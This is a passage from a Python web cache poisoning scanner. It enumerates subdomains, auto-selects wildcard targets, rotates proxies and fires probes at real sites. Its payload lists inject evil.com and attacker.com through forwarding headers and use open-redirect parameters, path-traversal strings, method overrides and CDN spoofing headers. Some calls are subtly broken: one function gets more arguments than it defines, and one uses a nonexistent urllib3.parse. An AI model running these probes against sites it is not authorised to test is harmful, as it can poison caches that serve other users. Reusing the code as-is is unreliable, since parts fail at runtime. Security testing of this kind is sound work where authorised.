            'timing_analysis': self.analyze_response_timing(verification_resps).anomaly_score * 0.05,
            'header_analysis': self.analyze_headers(poison_resp, test_headers).risk_score * 0.05,
            'content_stability': content_stability * 0.15,
            'reflection_context': self.analyze_reflection_context(poison_resp, test_headers) * 0.20
        }

        confidence = sum(validation_scores.values())
        
        fp_score = self.calculate_false_positive_score(
            original_resp, 
            poison_resp, 
            verification_resps,
            validation_scores,
            chain_analysis
        )

        is_poisoned = (
            confidence >= self.min_confidence_threshold and
            fp_score <= 0.05 and
            len(verification_resps) >= self.min_verification_requests and
            chain_analysis.cache_hits >= (len(verification_resps) * self.min_cache_hit_ratio)
        )

        return AdvancedPoisonCheck(
            is_poisoned=is_poisoned,
            confidence=confidence,
            technique=technique,
            evidence={
                'validation_scores': validation_scores,
                'chain_analysis': {
                    'cache_hits': chain_analysis.cache_hits,
                    'timing_deltas': chain_analysis.timing_deltas,
                    'chain_broken': chain_analysis.chain_broken
                },
                'verification_count': len(verification_resps),
                'false_positive_score': fp_score
            },
            verification_count=len(verification_resps),
            false_positive_score=fp_score
        )

    def calculate_false_positive_score(self, original_resp: requests.Response,
                                    poison_resp: requests.Response,
                                    verification_resps: List[requests.Response],
                                    validation_scores: Dict[str, float]) -> float:
        fp_indicators = {
            'dynamic_content': self.check_dynamic_content_fp(verification_resps),
            'cache_inconsistency': self.check_cache_inconsistency_fp(verification_resps),
            'error_responses': self.check_error_responses_fp(verification_resps),
            'timing_anomalies': self.check_timing_anomalies_fp(verification_resps),
            'header_anomalies': self.check_header_anomalies_fp(original_resp, verification_resps)
        }
        
        weights = {
            'dynamic_content': 0.3,
            'cache_inconsistency': 0.25,
            'error_responses': 0.2,
            'timing_anomalies': 0.15,
            'header_anomalies': 0.1
        }
        
        fp_score = sum(score * weights[indicator] 
                      for indicator, score in fp_indicators.items())
                      
        if self.matches_fp_patterns(poison_resp, verification_resps):
            fp_score += 0.3
            
        return min(fp_score, 1.0)

    def check_dynamic_content_fp(self, responses: List[requests.Response]) -> float:
        dynamic_ratios = []
        
        for resp in responses:
            content = self.normalize_response(resp)
            ratio = self.calculate_dynamic_ratio(content)
            dynamic_ratios.append(ratio)
            
        if len(dynamic_ratios) >= 2:
            variance = statistics.variance(dynamic_ratios)
            if variance > 0.1:
                return 0.8
                
        avg_ratio = sum(dynamic_ratios) / len(dynamic_ratios)
        if avg_ratio > self.max_dynamic_ratio:
            return 0.6
            
        return 0.0

    def validate_cache_key_match(self, original_resp: requests.Response,
                               poison_resp: requests.Response,
                               verification_resps: List[requests.Response]) -> float:
        original_key = self.analyze_cache_key_components(original_resp)
        poison_key = self.analyze_cache_key_components(poison_resp)
        
        shared_components = set(original_key.components) & set(poison_key.components)
        total_components = set(original_key.components) | set(poison_key.components)
        
        if not total_components:
            return 0.0
            
        component_similarity = len(shared_components) / len(total_components)
        
        sensitivity_match = all(
            abs(original_key.sensitivity.get(comp, 0) - 
                poison_key.sensitivity.get(comp, 0)) < 0.1
            for comp in shared_components
        )
        
        verification_keys = [
            self.analyze_cache_key_components(resp)
            for resp in verification_resps
        ]
        
        key_consistency = all(
            self.compare_cache_keys(poison_key, verify_key) > 0.9
            for verify_key in verification_keys
        )
        
        score = (
            component_similarity * 0.4 +
            (1.0 if sensitivity_match else 0.0) * 0.3 +
            (1.0 if key_consistency else 0.0) * 0.3
        )
        
        return score

    def compare_cache_keys(self, key1: CacheKeyAnalysis, 
                         key2: CacheKeyAnalysis) -> float:
        if key1.normalized_key == key2.normalized_key:
            return 1.0
            
        shared_components = set(key1.components) & set(key2.components)
        total_components = set(key1.components) | set(key2.components)
        
        if not total_components:
            return 0.0
            
        component_sim = len(shared_components) / len(total_components)
        
        sensitivity_diffs = []
        for comp in shared_components:
            sens1 = key1.sensitivity.get(comp, 0)
            sens2 = key2.sensitivity.get(comp, 0)
            sensitivity_diffs.append(abs(sens1 - sens2))
            
        avg_sens_diff = (
            sum(sensitivity_diffs) / len(sensitivity_diffs)
            if sensitivity_diffs else 1.0
        )
        
        return component_sim * (1 - avg_sens_diff)

    def analyze_response_timing(self, responses: List[requests.Response]) -> TimingAnalysis:
        timings = [r.elapsed.total_seconds() for r in responses]
        
        if not timings:
            return TimingAnalysis(0, [], 'unknown', 0)
            
        baseline = statistics.mean(timings[:3]) if len(timings) >= 3 else timings[0]
        
        mean = statistics.mean(timings)
        stdev = statistics.stdev(timings) if len(timings) > 1 else 0
        variance = statistics.variance(timings) if len(timings) > 1 else 0
        
        if stdev > self.timing_thresholds['anomaly'] * baseline:
            pattern = 'anomalous'
            anomaly_score = min(1.0, stdev / (baseline * 3))
        elif variance > self.timing_thresholds['variance']:
            pattern = 'variable'
            anomaly_score = min(1.0, variance / self.timing_thresholds['variance'])
        else:
            pattern = 'consistent'
            anomaly_score = 0.0
            
        return TimingAnalysis(
            baseline_timing=baseline,
            response_timings=timings,
            timing_pattern=pattern,
            anomaly_score=anomaly_score
        )

    def analyze_headers(self, response: requests.Response, test_headers: Dict) -> HeaderAnalysis:
        reflected = {}
        injection_points = []
        context_risks = {}
        
        for header, value in test_headers.items():
            reflections = self.find_header_reflections(response, header, str(value))
            if reflections:
                reflected[header] = reflections
                
                contexts = self.analyze_reflection_contexts(reflections)
                if contexts['dangerous']:
                    injection_points.append(header)
                context_risks[header] = contexts['risk_score']
        
        risk_score = self.calculate_header_risk(
            reflected, 
            injection_points,
            context_risks
        )
        
        return HeaderAnalysis(
            reflected_count=len(reflected),
            reflection_patterns=reflected,
            injection_points=injection_points,
            risk_score=risk_score
        )

    def find_header_reflections(self, response: requests.Response, 
                              header: str, value: str) -> List[str]:
        reflections = []
        
        for resp_header, resp_value in response.headers.items():
            if value in resp_value:
                reflections.append(f"header:{resp_header}")
        
        content = response.text.lower()
        value_lower = value.lower()
        
        patterns = [
            value_lower,
            re.escape(value_lower),
            urllib3.parse.quote(value_lower),
            urllib3.parse.quote_plus(value_lower)
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, content)
            for match in matches:
                context = content[max(0, match.start()-20):min(len(content), match.end()+20)]
                reflections.append(f"content:{context}")
        
        return reflections

    def check_injection_point(self, header: str, reflections: List[str]) -> bool:
        for reflection in reflections:
            if reflection.startswith('content:'):
                context = reflection.split(':', 1)[1]
                
                dangerous_contexts = [
                    r'<script[^>]*>.*?</script>',
                    r'javascript:',
                    r'data:',
                    r'src=["\']',
                    r'href=["\']',
                    r'url\(["\']?'
                ]
                
                if any(re.search(pattern, context, re.I) for pattern in dangerous_contexts):
                    return True
                    
        return False

    def calculate_header_risk(self, reflected: Dict[str, List[str]],
                            injection_points: List[str],
                            context_risks: Dict[str, float]) -> float:
        if not reflected:
            return 0.0
            
        risk_factors = {
            'reflection_count': len(reflected) / 10,
            'injection_points': len(injection_points) / len(reflected) if reflected else 0,
            'critical_headers': 0.0,
            'context_risk': max(context_risks.values()) if context_risks else 0
        }
        
        critical_headers = {
            'host': 0.2,
            'x-forwarded-host': 0.2,
            'x-original-url': 0.15,
            'x-rewrite-url': 0.15,
            'x-forwarded-proto': 0.1,
            'x-forwarded-scheme': 0.1
        }
        
        for header in reflected:
            if header.lower() in critical_headers:
                current_risk = critical_headers[header.lower()]
                if header in context_risks:
                    current_risk *= (1 + context_risks[header])
                risk_factors['critical_headers'] = max(
                    risk_factors['critical_headers'],
                    current_risk
                )
        
        return min(1.0, sum(risk_factors.values()))

    def analyze_reflection_context(self, response: requests.Response, test_headers: Dict) -> float:
        dangerous_contexts = {
            'script': (r'<script[^>]*>.*?</script>', 0.9),
            'meta': (r'<meta[^>]*>', 0.7),
            'url': (r'(?:href|src|url)\s*=\s*["\']([^"\']*)', 0.8),
            'javascript': (r'javascript:', 0.9),
            'data_uri': (r'data:', 0.8),
            'eval': (r'eval\(', 0.9),
            'inline_js': (r'on\w+\s*=', 0.8),
            'css_import': (r'@import\s+["\']', 0.7),
            'html_comment': (r'<!--.*?-->', 0.5),
            'json_data': (r'"(?:url|src|href)"\s*:\s*"([^"]*)"', 0.7)
        }
        
        risk_score = 0.0
        for header_value in test_headers.values():
            for context, (pattern, weight) in dangerous_contexts.items():
                if re.search(f"{pattern}.*?{re.escape(str(header_value))}", response.text, re.I):
                    risk_score += weight
        
        return min(1.0, risk_score)

    def analyze_response_chain(self, responses: List[requests.Response]) -> ResponseChain:
        if len(responses) < 2:
            return ResponseChain(
                original=None,
                poisoned=None,
                verifications=[],
                timing_deltas=[],
                cache_hits=0,
                chain_broken=True
            )
        
        original = responses[0]
        poisoned = responses[1]
        verifications = responses[2:]
        
        timing_deltas = []
        cache_hits = 0
        base_timing = original.elapsed.total_seconds()
        
        for resp in verifications:
            timing_deltas.append(abs(resp.elapsed.total_seconds() - base_timing))
            if self.is_cache_hit(resp):
                cache_hits += 1
        
        chain_broken = (
            cache_hits / len(verifications) < self.min_cache_hit_ratio or
            any(delta > self.max_timing_variance * base_timing for delta in timing_deltas)
        )
        
        return ResponseChain(
            original=original,
            poisoned=poisoned,
            verifications=verifications,
            timing_deltas=timing_deltas,
            cache_hits=cache_hits,
            chain_broken=chain_broken
        )

    def is_cache_hit(self, response: requests.Response) -> bool:
        cache_indicators = {
            'X-Cache': {'HIT', 'TCP_HIT'},
            'CF-Cache-Status': {'HIT'},
            'X-Drupal-Cache': {'HIT'},
            'X-Varnish-Cache': {'HIT'},
            'Fastly-Debug-Digest': None,
            'Age': lambda x: int(x) > 0 if x.isdigit() else False
        }
        
        for header, validator in cache_indicators.items():
            if header in response.headers:
                if validator is None:
                    return True
                elif callable(validator):
                    return validator(response.headers[header])
                else:
                    return response.headers[header] in validator
                
        return False

    def enumerate_subdomains_for_target(self, domain: str) -> List[str]:
        try:
            process = subprocess.run(
                ['subfinder', '-d', domain, '-silent', '-recursive'],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if process.returncode != 0:
                self.logger.error(f"Subfinder failed for {domain}: {process.stderr}")
                return []
            
            subdomains = set(
                sub.strip() 
                for sub in process.stdout.split('\n') 
                if sub.strip() and not sub.startswith('*')
            )
            
            validated_subdomains = []
            for subdomain in subdomains:
                if not subdomain.startswith(('http://', 'https://')):
                    https_url = f'https://{subdomain}'
                    try:
                        resp = self.make_request(https_url)
                        if resp and resp.status_code != 404:
                            validated_subdomains.append(https_url)
                            continue
                    except Exception:
                        pass
                    
                    http_url = f'http://{subdomain}'
                    try:
                        resp = self.make_request(http_url)
                        if resp and resp.status_code != 404:
                            validated_subdomains.append(http_url)
                    except Exception:
                        pass
                else:
                    validated_subdomains.append(subdomain)
            
            return validated_subdomains
            
        except subprocess.TimeoutExpired:
            self.logger.error(f"Subdomain enumeration timed out for {domain}")
            return []
        except Exception as e:
            self.logger.error(f"Subdomain enumeration failed for {domain}: {e}")
            return []

    def init_reflection_patterns(self) -> Dict[str, List[str]]:
        return {
            'html_context': [
                r'<[^>]*?(?:src|href|action)\s*=\s*["\']([^"\']*)',
                r'<meta[^>]*?content\s*=\s*["\']([^"\']*)',
                r'url\(["\']?([^"\')]+)',
                r'<(?:script|link|img|iframe)[^>]*?(?:src|href)\s*=\s*["\']([^"\']*)',
                r'@import\s+["\']([^"\']+)',
                r'<base[^>]*?href\s*=\s*["\']([^"\']*)'
            ],
            'script_context': [
                r'<script[^>]*?>.*?</script>',
                r'javascript:.*?["\']([^"\']+)',
                r'eval\(["\']([^"\']+)',
                r'document\.(?:location|URL|documentURI|referrer|write|writeln)\s*=\s*["\']([^"\']+)',
                r'(?:window|self|top|parent)\.(?:location|name)\s*=\s*["\']([^"\']+)',
                r'(?:src|href|url|domain|path)\s*:\s*["\']([^"\']+)'
            ],
            'header_context': [
                r'location:\s*([^\n]+)',
                r'refresh:\s*\d+;\s*url=([^\n]+)',
                r'content-security-policy.*?\'([^\']+)',
                r'access-control-allow-origin:\s*([^\n]+)',
                r'x-frame-options:\s*allow-from\s+([^\n]+)',
                r'link:\s*<([^>]+)>'
            ],
            'data_context': [
                r'data:(?:[^;]*;)*(?:base64,)?([^"\')\s]+)',
                r'blob:([^"\')\s]+)',
                r'file:(?:\/\/)?([^"\')\s]+)',
                r'(?:ws|wss|ftp|sftp|smtp|ldap|dict|gopher|nntp):\/\/([^"\')\s]+)'
            ]
        }

    def init_injection_signatures(self) -> List[Dict]:
        return [
            {
                'type': 'xss',
                'patterns': [
                    r'<script[^>]*>.*?</script>',
                    r'javascript:',
                    r'onerror=',
                    r'onload=',
                    r'onclick=',
                    r'onmouseover=',
                    r'onfocus=',
                    r'onblur=',
                    r'alert\(',
                    r'prompt\(',
                    r'confirm\('
                ],
                'risk': 0.9
            },
            {
                'type': 'open_redirect',
                'patterns': [
                    r'(https?:)?//[^/]+\.[^/]+/',
                    r'\/\/[^/]+\.[^/]+\/',
                    r'\\[^/]+\.[^/]+\\',
                    r'(?:url|redirect|return_to|next|target)=https?://',
                    r'(?:url|redirect|return_to|next|target)=%2f%2f'
                ],
                'risk': 0.8
            },
            {
                'type': 'cache_control',
                'patterns': [
                    r'cache-control:\s*([^\n]+)',
                    r'x-cache:\s*([^\n]+)',
                    r'age:\s*\d+',
                    r'expires:\s*([^\n]+)',
                    r'etag:\s*["\']([^"\']+)',
                    r'last-modified:\s*([^\n]+)'
                ],
                'risk': 0.7
            },
            {
                'type': 'header_injection',
                'patterns': [
                    r'\r\n(?:[^\r\n]+:|\s+)[^\r\n]+$',
                    r'\n(?:[^\n]+:|\s+)[^\n]+$',
                    r'[\r\n]\s*content-type:\s*text/html',
                    r'[\r\n]\s*content-length:\s*\d+',
                    r'[\r\n]\s*set-cookie:\s*[^\r\n]+'
                ],
                'risk': 0.85
            }
        ]

    def init_fp_patterns(self) -> List[Dict]:
        return [
            {
                'type': 'dynamic_content',
                'patterns': [
                    r'\b[0-9a-f]{32}\b',
                    r'\b[0-9a-f]{40}\b',
                    r'\b[0-9a-f]{64}\b',
                    r'\b\d{10,13}\b',
                    r'\b[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}\b',
                    r'\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}',
                    r'\b[A-Za-z0-9+/]{32,}={0,2}\b'
                ]
            },
            {
                'type': 'common_headers',
                'patterns': [
                    r'x-request-id:\s*([^\n]+)',
                    r'x-correlation-id:\s*([^\n]+)',
                    r'etag:\s*([^\n]+)',
                    r'x-runtime:\s*\d+\.\d+',
                    r'x-powered-by:\s*([^\n]+)',
                    r'server:\s*([^\n]+)',
                    r'x-aspnet-version:\s*([^\n]+)'
                ]
            },
            {
                'type': 'analytics',
                'patterns': [
                    r'(?:google|ga|gtm|analytics|pixel|tracking)[-_]?id\s*[=:]\s*["\']?[^"\']+',
                    r'(?:facebook|fb)[-_]?(?:app|pixel)[-_]?id\s*[=:]\s*["\']?\d+',
                    r'(?:linkedin|twitter|pinterest)[-_]?(?:tag|pixel)\s*[=:]\s*["\']?[^"\']+',
                    r'(?:optimizely|hotjar|intercom|crisp|drift|zendesk)[-_]?id\s*[=:]\s*["\']?[^"\']+'
                ]
            }
        ]

    def generate_cache_key_variations(self) -> List[Dict]:
        variations = []
        
        base_variations = {
            'standard': {
                'method': 'GET',
                'headers': {},
                'params': {}
            },
            'case_variation': {
                'headers': {
                    'Host': 'EXAMPLE.COM',
                    'Accept': 'TEXT/HTML'
                }
            },
            'encoding_variation': {
                'headers': {
                    'Accept-Encoding': ['gzip', 'deflate', 'br', '*']
                }
            },
            'path_variation': {
                'paths': [
                    '/./path',
                    '//path',
                    '/path/',
                    '/path/.',
                    '/path?',
                    '/path#'
                ]
            }
        }
        
        header_variations = [
            {'Host': 'example.com'},
            {'X-Forwarded-Host': 'example.com'},
            {'X-Host': 'example.com'},
            {'X-Forwarded-Server': 'example.com'},
            {'X-HTTP-Host-Override': 'example.com'},
            {'X-Original-Host': 'example.com'}
        ]
        
        scheme_variations = [
            {'X-Forwarded-Proto': 'http'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Scheme': 'http'},
            {'X-Forwarded-Scheme': 'https'}
        ]
        
        param_variations = [
            {'cache': ['1', 'true', 'yes']},
            {'no-cache': ['0', 'false', 'no']},
            {'v': ['1', str(int(time.time()))]},
            {'_': [str(int(time.time()))]},
        ]
        
        variations.extend([
            {
                'type': var_type,
                'config': config
            } for var_type, config in base_variations.items()
        ])
        
        for headers in header_variations:
            variations.append({
                'type': 'header_variation',
                'config': {
                    'headers': headers
                }
            })
        
        for scheme in scheme_variations:
            variations.append({
                'type': 'scheme_variation',
                'config': {
                    'headers': scheme
                }
            })
        
        for params in param_variations:
            for param, values in params.items():
                for value in values:
                    variations.append({
                        'type': 'param_variation',
                        'config': {
                            'params': {param: value}
                        }
                    })
        
        cdn_variations = {
            'cloudflare': [
                {'CF-Connecting-IP': '127.0.0.1'},
                {'CF-IPCountry': 'XX'},
                {'CF-Worker': 'true'},
                {'CF-Cache-Tag': 'custom-tag'},
                {'CF-Request-ID': str(uuid.uuid4())}
            ],
            'fastly': [
                {'Fastly-SSL': '1'},
                {'Fastly-Force-Shield': '1'},
                {'X-Fastly-Client-IP': '127.0.0.1'},
                {'Fastly-Debug': '1'},
                {'Fastly-Temp-XFF': '127.0.0.1'}
            ],
            'akamai': [
                {'True-Client-IP': '127.0.0.1'},
                {'Akamai-Origin-Hop': '1'},
                {'X-Akamai-Cache-Key': 'custom-key'},
                {'Akamai-Cache-Control': 'max-age=0'},
                {'X-Akamai-Config-Log-Detail': '1'}
            ],
            'varnish': [
                {'X-Varnish-Host': 'example.com'},
                {'X-Varnish-TTL': '0'},
                {'X-Varnish-Debug': '1'},
                {'X-Varnish-Cache': 'MISS'}
            ]
        }
        
        for cdn, headers_list in cdn_variations.items():
            for headers in headers_list:
                variations.append({
                    'type': f'cdn_variation_{cdn}',
                    'config': {
                        'headers': headers
                    }
                })
        
        combination_variations = []
        for i, var1 in enumerate(variations):
            for var2 in variations[i+1:]:
                if var1['type'] != var2['type']:
                    combined_config = {
                        'headers': {
                            **var1.get('config', {}).get('headers', {}),
                            **var2.get('config', {}).get('headers', {})
                        },
                        'params': {
                            **var1.get('config', {}).get('params', {}),
                            **var2.get('config', {}).get('params', {})
                        }
                    }
                    combination_variations.append({
                        'type': f"combined_{var1['type']}_{var2['type']}",
                        'config': combined_config
                    })
        
        variations.extend(random.sample(combination_variations, 
                                     min(len(combination_variations), 10)))
        
        return variations

    def load_poisoning_techniques(self) -> List[Dict]:
        return [
            {
                'name': 'header_injection',
                'description': 'Tests for header-based cache poisoning',
                'headers': {
                    'X-Forwarded-Host': ['evil.com', 'attacker.com'],
                    'X-Original-URL': ['/admin', '/internal'],
                    'X-Forwarded-Scheme': ['http', 'https'],
                    'X-Forwarded-Proto': ['http', 'https'],
                    'X-Host': ['evil.com', 'attacker.com'],
                    'X-Forwarded-Server': ['evil.com', 'internal.evil.com']
                },
                'risk_level': 'high',
                'validation_requirements': {
                    'min_requests': 15,
                    'confidence_threshold': 0.95,
                    'verification_delay': 2.0
                }
            },
            {
                'name': 'parameter_pollution',
                'description': 'Tests for cache key pollution via parameters',
                'parameters': {
                    'cache_buster': ['1', str(int(time.time()))],
                    'orig_uri': ['/admin', '/internal'],
                    'redirect_to': ['evil.com'],
                    'path': ['../admin', '..%2fadmin'],
                    'url': ['https://evil.com', '//evil.com']
                },
                'risk_level': 'medium',
                'validation_requirements': {
                    'min_requests': 10,
                    'confidence_threshold': 0.90,
                    'verification_delay': 1.5
                }
            },
            {
                'name': 'cdn_specific',
                'description': 'Tests CDN-specific poisoning vectors',
                'vectors': {
                    'cloudflare': {
                        'headers': {
                            'CF-Connecting-IP': ['127.0.0.1'],
                            'X-Forwarded-For': ['127.0.0.1'],
                            'CF-Worker': ['true'],
                            'CF-IPCountry': ['XX'],
                            'CF-Cache-Tag': ['custom-tag']
                        }
                    },
                    'fastly': {
                        'headers': {
                            'Fastly-SSL': ['1'],
                            'Fastly-Force-Shield': ['1'],
                            'X-Fastly-Client-IP': ['127.0.0.1'],
                            'Fastly-Debug': ['1']
                        }
                    },
                    'akamai': {
                        'headers': {
                            'True-Client-IP': ['127.0.0.1'],
                            'Akamai-Origin-Hop': ['1'],
                            'X-Akamai-Cache-Key': ['custom-key']
                        }
                    },
                    'varnish': {
                        'headers': {
                            'X-Varnish-Host': ['evil.com'],
                            'X-Varnish-Debug': ['1'],
                            'X-Varnish-Cache': ['MISS']
                        }
                    }
                },
                'risk_level': 'high',
                'validation_requirements': {
                    'min_requests': 20,
                    'confidence_threshold': 0.98,
                    'verification_delay': 3.0
                }
            },
            {
                'name': 'path_confusion',
                'description': 'Tests for cache poisoning via path confusion',
                'paths': [
                    '/./admin',
                    '//admin',
                    '/admin/',
                    '/admin?',
                    '/admin#',
                    '/%2e/admin',
                    '/.%2e/admin',
                    '/..%2f/admin',
                    '/%252e/admin'
                ],
                'risk_level': 'medium',
                'validation_requirements': {
                    'min_requests': 12,
                    'confidence_threshold': 0.92,
                    'verification_delay': 2.0
                }
            },
            {
                'name': 'method_override',
                'description': 'Tests for cache poisoning via HTTP method override',
                'headers': {
                    'X-HTTP-Method-Override': ['POST', 'PUT', 'DELETE'],
                    'X-Method-Override': ['POST', 'PUT', 'DELETE'],
                    'X-Original-Method': ['POST', 'PUT', 'DELETE']
                },
                'risk_level': 'medium',
                'validation_requirements': {
                    'min_requests': 8,
                    'confidence_threshold': 0.88,
                    'verification_delay': 1.0
                }
            },
            {
                'name': 'encoding_confusion',
                'description': 'Tests for cache poisoning via encoding confusion',
                'headers': {
                    'Accept-Encoding': ['gzip, deflate, br', '*', 'identity'],
                    'X-Forwarded-Encoding': ['gzip', 'deflate', 'br'],
                    'Accept': ['*/*', 'application/json', 'text/html']
                },
                'risk_level': 'low',
                'validation_requirements': {
                    'min_requests': 10,
                    'confidence_threshold': 0.85,
                    'verification_delay': 1.5
                }
            }
        ]

    def prepare_result_for_output(self, result: Dict) -> Dict:
        def convert_value(v):
            if isinstance(v, (set, frozenset)):
                return list(v)
            elif isinstance(v, requests.Response):
                return {
                    'status_code': v.status_code,
                    'headers': dict(v.headers),
                    'url': v.url,
                    'text': v.text[:1000]
                }
            elif isinstance(v, dict):
                return {k: convert_value(val) for k, val in v.items()}
            elif isinstance(v, (list, tuple)):
                return [convert_value(item) for item in v]
            return v

        return convert_value(result)

def main():
    parser = argparse.ArgumentParser(
        description='Web Cache Poison Detector',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--proxy-list', help='Proxy list file')
    parser.add_argument('--auto', action='store_true', help='Auto-select targets from wildcards.txt')
    parser.add_argument('--no-notify', action='store_true', help='Disable live Telegram notifications')
    
    sub_group = parser.add_mutually_exclusive_group()
    sub_group.add_argument('--sub', action='store_true', help='Enable subdomain enumeration')
    sub_group.add_argument('--no-sub', action='store_true', help='Disable subdomain enumeration')
    
    args = parser.parse_args()
    
    if not args.url and not args.auto:
        parser.error("Either --url or --auto is required")
    
    enable_subdomain_enum = False
    if args.auto:
        enable_subdomain_enum = not args.no_sub
    elif args.sub:
        enable_subdomain_enum = True
    
    try:
        detector = CachePoisonDetector(
            target_url=args.url,
            threads=args.threads,
            timeout=args.timeout,
            proxy_list_url=args.proxy_list,
            auto_mode=args.auto,
            enable_subdomain_enum=enable_subdomain_enum,
            notifications_disabled=args.no_notify
        )
        
        results = detector.scan_all()
        
        if args.output and results:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"[+] Results saved to {args.output}")
        
        sys.exit(1 if results else 0)
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 
